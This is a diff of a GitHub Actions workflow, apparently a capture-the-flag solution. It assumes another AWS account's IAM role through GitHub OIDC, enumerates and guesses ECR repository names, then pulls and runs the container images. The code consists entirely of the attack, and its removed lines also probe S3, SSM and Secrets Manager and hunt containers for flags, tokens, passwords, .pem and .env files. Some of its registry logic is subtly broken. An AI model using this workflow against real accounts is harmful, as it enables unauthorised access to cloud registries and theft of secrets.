@@ -1,120 +1,190 @@
-name: Explore AWS ECR & Containers
+# .github/workflows/discover-ecr.yml
+name: Discover ECR Registries & Images
 
 on:
-  workflow_dispatch:
-  push:
-    branches:
-      - main
+  workflow_dispatch: {}
 
 permissions:
   id-token: write
   contents: read
 
 jobs:
-  explore-ecr:
+  discover:
     runs-on: ubuntu-latest
+    env:
+      ROLE_TO_ASSUME: arn:aws:iam::396961015104:role/imaginary-challenge
+      REGIONS: us-east-1 us-west-2 eu-west-1 ap-southeast-1 ap-northeast-1
+      # small default candidate repo list - extend or provide wordlist.txt in repo root
+      CANDIDATE_REPOS: >
+        never-imagined never_imagined i-never-imagined
+        misconfigure-cloud misconfigured-cloud cloud-misconfiguration
+        github-actions-insecure actions-insecure insecure-actions
+        fiddling-workflow fiddle-workflow workflow-fiddling
+        download-docker-image docker-download image-download
+        where-docker from-where where-from oidc-cool cool-oidc oidc-misconfigured
+        be-careful careful-oidc oidc-careful registry registry-image app backend frontend
+
     steps:
-      - name: Checkout repo
+      - name: Checkout repo (to optionally read wordlist)
         uses: actions/checkout@v4
 
-      - name: Configure AWS credentials (assume role via OIDC)
+      - name: Configure AWS Credentials (Assume role via OIDC)
         uses: aws-actions/configure-aws-credentials@v4
         with:
-          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
+          role-to-assume: ${{ env.ROLE_TO_ASSUME }}
           aws-region: us-east-1
 
-      - name: Print identity (who we are)
+      - name: Show identity & env
         run: |
-          echo "=== Caller identity ==="
-          aws sts get-caller-identity
+          echo "Caller:"
+          aws sts get-caller-identity || true
+          echo "ENV - ECR_REGISTRY may be set by other workflows"
+          env | grep -i aws || true
 
-      - name: Try read-ish AWS services (best-effort)
+      - name: Install jq
         run: |
-          echo "=== S3 buckets ==="
-          aws s3 ls || echo "No S3 list access or denied"
+          sudo apt-get update -y
+          sudo apt-get install -y jq
 
-          echo "=== SSM parameters (describe) ==="
-          aws ssm describe-parameters --max-results 10 || echo "No SSM access or denied"
-
-          echo "=== Secrets Manager ==="
-          aws secretsmanager list-secrets --max-results 10 || echo "No Secrets Manager access or denied"
-
-          echo "=== CloudFormation stacks ==="
-          aws cloudformation list-stacks --max-results 10 || echo "No CloudFormation access or denied"
-
-      - name: Describe ECR repositories (multi-region)
-        run: |
-          for region in us-east-1 us-west-2 eu-west-1; do
-            echo "Region: $region"
-            aws ecr describe-repositories --region $region || echo "No ECR access in $region or none present"
-          done
-
-      - name: Get ECR login (docker)
-        id: ecr_login
-        run: |
-          set -e
-          echo "=== Getting ECR login password and docker login ==="
-          aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 396961015104.dkr.ecr.us-east-1.amazonaws.com
-          echo "Docker login succeeded"
-
-      - name: Try listing local docker images (sanity)
-        run: |
-          docker images --format "{{.Repository}}:{{.Tag}}\t{{.ID}}"
-
-      - name: Try to discover and inspect a few likely image names (safe-ish)
-        # THIS WILL PULL IMAGES if they exist. It runs the container read-only with dropped capabilities.
+      - name: Enumerate ECR repositories across regions
+        id: enumerate
         run: |
           set -euo pipefail
-          REPO=396961015104.dkr.ecr.us-east-1.amazonaws.com
-          PHRASES=(
-            "never-imagined" "never_imagined" "i-never-imagined"
-            "misconfigure-cloud" "misconfigured-cloud" "cloud-misconfiguration"
-            "github-actions-insecure" "actions-insecure" "insecure-actions"
-            "download-docker-image" "image-download" "where-from"
-            "oidc-misconfigured" "careful-oidc"
-          )
+          mkdir -p ecr-output
+          echo "Regions: $REGIONS"
+          > ecr-output/all_repos.json
+          for region in $REGIONS; do
+            echo "== region: $region =="
+            # describe repositories (handle pagination)
+            TOKEN=""
+            first=true
+            echo "[" > ecr-output/repos_${region}.json
+            while true; do
+              if [ -z "$TOKEN" ]; then
+                ARGS="--region $region"
+              else
+                ARGS="--region $region --next-token $TOKEN"
+              fi
+              out=$(aws ecr describe-repositories $ARGS --output json 2>/dev/null || echo '{"repositories": []}')
+              repos=$(echo "$out" | jq -c '.repositories[]?')
+              # write each repo object as JSON array elements
+              if [ -n "$repos" ]; then
+                echo "$repos" | jq -s '.' | jq -c '.[]' | while read -r r; do
+                  # append with comma handling
+                  if [ "$first" = true ]; then
+                    first=false
+                    echo "$r" >> ecr-output/repos_${region}.json
+                  else
+                    echo ",$r" >> ecr-output/repos_${region}.json
+                  fi
+                done
+              fi
+              TOKEN=$(echo "$out" | jq -r '.nextToken // empty')
+              [ -z "$TOKEN" ] && break
+            done
+            echo "]" >> ecr-output/repos_${region}.json
+            # merge into global file
+            if [ -s ecr-output/repos_${region}.json ]; then
+              jq -s 'add' ecr-output/repos_${region}.json ecr-output/all_repos.json > ecr-output/tmp_all.json 2>/dev/null || cp ecr-output/repos_${region}.json ecr-output/tmp_all.json
+              mv ecr-output/tmp_all.json ecr-output/all_repos.json || true
+            fi
+          done
+          echo "Saved repository lists to ecr-output/"
+          ls -la ecr-output || true
 
-          for name in "${PHRASES[@]}"; do
-            IMAGE="$REPO/$name:latest"
-            echo "--- Trying $IMAGE ---"
-            if docker pull "$IMAGE" 2>/dev/null; then
-              echo "+++ Pulled $IMAGE"
-              echo "=== Inspecting image layers and metadata ==="
-              docker inspect "$IMAGE" || true
-              echo "=== Running container in restricted mode to search for flags/secrets ==="
+      - name: Try to inspect images and manifests for discovered repos + candidates
+        id: inspect
+        run: |
+          set -euo pipefail
+          mkdir -p ecr-inspect
+          # load discovered repos
+          REPO_NAMES=$(jq -r '.[].repositoryName' ecr-output/all_repos.json 2>/dev/null || true)
+          echo "Discovered repo names:"
+          echo "$REPO_NAMES" | sed -n '1,200p' || true
 
-              # run with read-only FS, drop capabilities and limit memory/time
-              # we run a simple find that searches for candidate filenames, limited depth
-              docker run --rm \
-                --read-only \
-                --pids-limit=64 \
-                --memory=256m \
-                --cap-drop ALL \
-                --entrypoint sh \
-                "$IMAGE" -c '\
-                  echo "--- env vars (filtered) ---"; env | grep -i "FLAG\|SECRET\|TOKEN\|PASSWORD" || true; \
-                  echo "--- find likely files (this may take a moment) ---"; \
-                  find / -xdev -maxdepth 4 -type f \( -iname "*flag*" -o -iname "*secret*" -o -iname "*.pem" -o -iname "*.env" -o -iname "*.txt" \) 2>/dev/null | head -n 200 || true; \
-                '
-              # don't continue to other phrases if found
-              break
+          # allow user-provided wordlist file to augment
+          if [ -f wordlist.txt ]; then
+            echo "Using repo names from wordlist.txt"
+            cat wordlist.txt >> /tmp/wordlist_local.txt
+          else
+            echo "$CANDIDATE_REPOS" | tr ' ' '\n' > /tmp/wordlist_local.txt
+          fi
+
+          # merge discovered + candidates into a unique list
+          ( echo "$REPO_NAMES"; cat /tmp/wordlist_local.txt ) | sed '/^$/d' | sort -u > /tmp/try_repos.txt
+
+          echo "Total repo names to try: $(wc -l < /tmp/try_repos.txt)"
+          aws ecr get-login-password --region us-east-1 >/tmp/ecr_pw 2>/dev/null || aws ecr get-login-password >/tmp/ecr_pw || true
+          # try login to registry(s) for docker pull attempts
+          for region in $REGIONS; do
+            REG="${{ github.repository_owner }}.dkr.ecr.$region.amazonaws.com" || true
+            # use actual account-based registry if env present
+            if [ -n "${ECR_REGISTRY:-}" ]; then
+              REG="$ECR_REGISTRY"
+            fi
+            echo "Attempt docker login to registry $REG (region $region)"
+            if cat /tmp/ecr_pw | docker login --username AWS --password-stdin $REG 2>/dev/null; then
+              echo "docker login succeeded to $REG"
             else
-              echo "Not found: $IMAGE"
+              echo "docker login failed to $REG (may still allow aws API inspect)"
             fi
           done
 
-      - name: Try a safer, generic ECR list/pagination (if permitted)
-        run: |
-          aws ecr describe-repositories --region us-east-1 --output table || echo "No describe-repositories permission or none present"
+          # For each target, try aws ecr describe-images, batch-get-image (manifest), and docker pull
+          while read -r repo; do
+            for region in $REGIONS; do
+              outdir=ecr-inspect/${region}
+              mkdir -p "$outdir"
+              echo "== Inspect: $repo (region $region) =="
+              # describe-images
+              aws ecr describe-images --repository-name "$repo" --region "$region" --output json > "$outdir"/describe_images_"$repo".json 2>/dev/null || echo "{}" > "$outdir"/describe_images_"$repo".json
+              # if we have imageIds, try batch-get-image for first few imageIds
+              tags=$(jq -r '.imageDetails[]? | (.imageTags[]? // empty)' "$outdir"/describe_images_"$repo".json 2>/dev/null || true)
+              if [ -n "$tags" ]; then
+                echo "Found tags for $repo: $(echo "$tags" | tr '\n' ',' | sed 's/,$//')"
+                # attempt to fetch manifest for first tag
+                tag=$(echo "$tags" | head -n1)
+                echo "Attempt batch-get-image for $repo:$tag"
+                aws ecr batch-get-image --repository-name "$repo" --region "$region" --image-ids imageTag="$tag" --output json > "$outdir"/batch_get_image_${repo}_${tag}.json 2>/dev/null || true
+              fi
 
-      - name: Print environment and workflow dir
-        run: |
-          echo "=== ENV related to AWS/OIDC ==="
-          env | sed -n 's/AWS/&&/Ip' || true
-          echo "=== Current directory ==="
-          pwd
-          ls -la
+              # try docker pull (best-effort)
+              # choose registry: prefer ECR_REGISTRY env if provided, else build from account id & region
+              REG="$ECR_REGISTRY"
+              if [ -z "$REG" ]; then
+                ACC_ID=$(aws sts get-caller-identity --query Account --output text 2>/dev/null || echo "396961015104")
+                REG="${ACC_ID}.dkr.ecr.${region}.amazonaws.com"
+              fi
+              full="$REG/$repo:latest"
+              echo "Trying docker pull $full"
+              if docker pull "$full" > "$outdir"/docker_pull_${repo}.txt 2>&1; then
+                echo "Pulled $full"
+                docker images | head -n 20 >> "$outdir"/docker_images.txt || true
+                # inspect container for obvious files (non-rooted)
+                docker run --rm --entrypoint sh "$full" -c "ls -la / || true" > "$outdir"/container_ls_root.txt 2>&1 || true
+              else
+                echo "Failed to pull $full (see $outdir/docker_pull_${repo}.txt)"
+              fi
+            done
+          done < /tmp/try_repos.txt
 
-      - name: Final note
+          echo "Inspection complete. Collected artifacts under ecr-inspect/"
+
+      - name: Summarize findings
         run: |
-          echo "If you need different role/region or a longer phrase list, edit the workflow. Be careful when running arbitrary images."
+          echo "=== Repo summary (first 200 chars each) ==="
+          for f in ecr-output/*.json; do
+            echo "FILE: $f"
+            head -c 200 "$f" || true
+            echo -e "\n---\n"
+          done
+          echo "=== Inspected image outputs (listing) ==="
+          find ecr-inspect -maxdepth 3 -type f -print -exec sed -n '1,60p' {} \; 2>/dev/null || true
+
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: ecr-discovery-output
+          path: |
+            ecr-output
+            ecr-inspect
